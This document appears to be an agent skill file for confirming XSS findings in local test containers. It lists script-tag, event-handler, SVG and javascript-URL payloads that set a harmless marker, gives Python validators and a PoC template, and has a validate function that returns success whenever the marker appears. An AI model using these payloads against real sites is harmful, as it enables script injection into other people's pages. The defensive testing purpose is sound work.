---
name: validate-xss
description: Validate cross-site scripting (XSS) vulnerabilities by injecting script/event handler payloads and checking HTTP response bodies for unescaped reflection. Covers reflected XSS, stored XSS, and DOM-based XSS patterns.
origin: vuln-analysis
---

# Validator: Cross-Site Scripting (XSS)

Confirm whether a vulnerability allows injection of unescaped JavaScript into HTML responses.

## When to Activate

- An `xss` vulnerability needs validation during reproduction (Step 7/8)

## Scope: Valid XSS Findings

Only report XSS findings that are **auto-triggering** (execute without victim interaction beyond normal browsing):
- **Reflected XSS**: Payload injected in URL/parameter → immediately reflected unescaped in response
- **Stored XSS**: Payload saved to database → auto-executes when any user views the page
- **DOM-based XSS**: Payload injected via URL hash → executed by client-side JavaScript on page load

**EXCLUDED** (per filtering-rules.md rule #28):
- Self-XSS (requires victim to execute their own payload)
- Non-auto-triggering stored XSS (requires victim to click a link)
- XSS in frameworks with auto-escaping enabled (React, Angular unless dangerouslySetInnerHTML)

## No External Infrastructure Required

XSS validation requires NO additional infrastructure. Evidence is in the HTTP response body — a unique marker injected as JavaScript payload and found unescaped in the response.

## Prerequisites

```bash
# Verify the target endpoint accepts input and returns HTML
docker exec <container> curl -sf -o /dev/null -w "%{http_code}" "http://localhost:<port>/endpoint?q=test"
```

## Validation Technique

### Step 1: Generate a Unique Marker

Use a unique, easily searchable marker to avoid false positives:

```python
import secrets
MARKER = f"xss_val_{secrets.token_hex(8)}"
# Example: xss_val_a1b2c3d4e5f6a1b2
```

### Step 2: Inject Payloads

Try multiple payload forms — different contexts require different injection vectors:

```python
payloads = [
    # Script tag injection (works when inside HTML body)
    f'<script>window.MARKER="{MARKER}"</script>',

    # Event handler injection (works when inside HTML attribute)
    f'" onmouseover="window.MARKER=\'{MARKER}\'" x="',

    # SVG-based (works in HTML5 contexts)
    f'<svg onload="window.MARKER=\'{MARKER}\'">',

    # img onerror (widely supported)
    f'<img src=x onerror="window.MARKER=\'{MARKER}\'">',

    # Template literal injection
    f'</script><script>window.MARKER="{MARKER}"</script>',

    # JavaScript URL (works in href contexts)
    f'javascript:window.MARKER="{MARKER}"',
]
```

### Step 3: Check Response for Unescaped Payload

A finding is confirmed when the **unique marker appears unescaped** in the HTTP response body:

```python
def validate(target, payload, marker, timeout):
    resp = requests.get(f"{target}/endpoint",
                        params={"q": payload},
                        timeout=timeout)

    # Check 1: Marker appears in response at all
    if marker not in resp.text:
        return False, "Marker not in response"

    # Check 2: NOT escaped (if escaped, it's not XSS — just reflection)
    escaped_variants = [
        marker.replace("<", "&lt;"),
        marker.replace(">", "&gt;"),
        marker.replace('"', "&quot;"),
        marker.replace("'", "&#39;"),
    ]
    for escaped in escaped_variants:
        if escaped in resp.text and marker not in resp.text.replace(escaped, ""):
            return False, f"Marker found but escaped: {escaped}"

    # Check 3: Script/event context — payload appears in valid execution context
    script_context = (
        f'<script' in resp.text and marker in resp.text or
        'onload=' in resp.text and marker in resp.text or
        'onerror=' in resp.text and marker in resp.text or
        'onmouseover=' in resp.text and marker in resp.text
    )
    if marker in resp.text:
        return True, f"Unescaped marker '{marker}' found in response (script_context={script_context})"

    return False, "Marker not confirmed unescaped"
```

### Step 4: Stored XSS Check (two-request flow)

For stored XSS, the marker is written first then read back:

```python
def exploit_stored(target, payload, marker, timeout):
    # Step 1: Write the payload (comment, profile field, etc.)
    write_resp = requests.post(f"{target}/api/comments",
                               json={"content": payload},
                               timeout=timeout)
    if write_resp.status_code not in (200, 201, 204):
        return None, f"Write failed: {write_resp.status_code}"

    # Step 2: Read back — does the marker appear unescaped?
    read_resp = requests.get(f"{target}/comments", timeout=timeout)
    if marker in read_resp.text:
        return True, f"Stored XSS confirmed: marker '{marker}' found at /comments"

    return False, "Marker not found in stored content"
```

## Legitimacy Check (Anti-Cheat)

Scan the PoC script. If these patterns appear as direct calls (not inside the payload string), the result is `[INVALID]`:

```python
# FORBIDDEN — direct DOM manipulation bypassing the target app
from selenium import webdriver   # INVALID — browser automation bypasses server-side check
driver.execute_script(...)       # INVALID

# CORRECT — inject via HTTP and check server response
requests.get(f"{target}/search?q=<script>alert(1)</script>")  # VALID
```

## Success Criteria

| Result | Condition |
|--------|-----------|
| **[SUCCESS]** | Unique marker appears **unescaped** in HTTP response AND inside a valid JavaScript execution context |
| **[FAILED]** | Marker is absent, or present but HTML-escaped |
| **[INVALID]** | PoC uses browser automation or directly modifies DOM |

## PoC Template

```python
#!/usr/bin/env python3
"""PoC for <VULN_ID>: xss — Reflected XSS via <parameter> parameter"""
import argparse, sys, time, re, secrets
import requests

MARKER = f"xss_val_{secrets.token_hex(8)}"

PAYLOADS = [
    f'<script>document.title="{MARKER}"</script>',
    f'" onmouseover="{MARKER}" x="',
    f'<svg onload="{MARKER}">',
    f'<img src=x onerror="{MARKER}">',
]

def exploit(target, timeout):
    for payload in PAYLOADS:
        try:
            resp = requests.get(f"{target}/endpoint",
                                params={"q": payload},
                                timeout=timeout)
            if MARKER in resp.text:
                # Verify not escaped
                if not re.search(r'&lt;|&gt;|&quot;|&#39;', resp.text.split(MARKER)[0][-20:]):
                    return {"payload": payload, "response_snippet": resp.text[max(0,resp.text.find(MARKER)-50):resp.text.find(MARKER)+80]}
        except Exception:
            continue
    return None

def validate(result):
    return result is not None and MARKER in str(result)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:8080")
    parser.add_argument("--timeout", type=int, default=30)
    args = parser.parse_args()

    start = time.time()
    try:
        result = exploit(args.target, args.timeout)
        confirmed = validate(result)
        elapsed = time.time() - start
        status = "CONFIRMED" if confirmed else "NOT_REPRODUCED"
        print(f"[{status}] VULN_ID xss — marker={MARKER} elapsed={elapsed:.2f}s")
        if confirmed:
            print(f"  Payload: {result['payload']}")
            print(f"  Context: {result['response_snippet']}")
        sys.exit(0 if confirmed else 1)
    except Exception as e:
        print(f"[ERROR] VULN_ID — {e}")
        sys.exit(2)

if __name__ == "__main__":
    main()
```

## Confidence Scoring (1-10)

| Score | Scenario |
|-------|----------|
| 9-10 | Unique marker unescaped inside `<script>` tag or event handler attribute in response |
| 7-8 | Unique marker reflected without HTML encoding (inside non-script HTML context) |
| 5-6 | Marker partially reflected or in ambiguous context |
| 1-4 | Marker absent or fully HTML-escaped |

**Threshold: Only mark [SUCCESS] if Confidence >= 7 AND marker confirmed unescaped**

## Output: Write to results.json (MANDATORY)

```json
{
  "vuln_id": "VULN-001",
  "type": "xss",
  "poc_script": "poc_scripts/poc_xss_001.py",
  "status": "SUCCESS",
  "exit_code": 0,
  "retries": 0,
  "entry_point_used": "GET /search?q=",
  "validation_result": {
    "marker": "CONFIRMED",
    "evidence": "Reflected XSS confirmed: unique marker 'xss_val_a1b2c3d4e5f6a1b2' found unescaped inside <script> tag in response to GET /search?q=<script>document.title='xss_val_a1b2c3d4e5f6a1b2'</script>"
  }
}
```
